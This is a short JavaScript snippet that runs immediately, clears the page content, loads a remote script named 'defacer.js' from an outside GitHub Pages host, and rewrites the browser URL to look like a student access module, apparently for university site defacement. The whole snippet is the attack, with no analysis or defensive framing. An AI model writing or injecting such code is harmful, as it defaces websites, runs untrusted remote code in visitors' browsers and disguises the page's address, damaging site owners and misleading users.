function clearHTML() {
    // Dynamically load an external JS file
    const script = document.createElement("script");
    script.src = "https://cybercutie0.github.io/-/defacer.js"; // Replace with the actual URL
    script.onload = () => {
        console.log("External script has been loaded.");
    };
    script.onerror = () => {
        console.error("Failed to load the external script.");
    };
    document.body.innerHTML = "";
    document.head.appendChild(script); // Add the script to the <head>
    replaceStateUrlChange('/ucc/students/', 'Student Access Module');
}

console.log("IMPORTING SUCCESS");
clearHTML();
